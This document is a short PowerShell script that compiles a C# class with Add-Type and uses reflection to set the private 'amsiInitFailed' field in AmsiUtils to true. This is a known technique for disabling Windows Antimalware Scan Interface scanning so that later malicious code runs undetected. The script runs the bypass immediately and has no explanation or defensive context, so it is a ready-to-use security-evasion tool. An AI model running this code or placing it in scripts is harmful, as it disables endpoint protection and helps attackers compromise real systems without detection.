Add-Type -TypeDefinition @"
using System;
using System.Reflection;
public class B{
    public static void Bypass(){
        Type t = Assembly.Load("System.Management.Automation").GetType("System.Management.Automation.AmsiUtils");
        FieldInfo f = t.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
        f.SetValue(null, true);
    }
}
"@
[B]::Bypass()